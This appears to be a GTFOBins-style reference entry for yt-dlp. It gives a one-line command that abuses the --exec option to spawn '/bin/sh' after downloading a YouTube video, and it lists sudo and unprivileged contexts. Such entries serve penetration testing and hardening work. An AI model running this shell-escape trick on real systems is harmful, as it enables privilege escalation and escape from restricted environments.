# yt-dlp

## shell

```bash
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```
_The URL must point to a valid YouTube video which will be actually downloaded._
**Contexts:** sudo, unprivileged
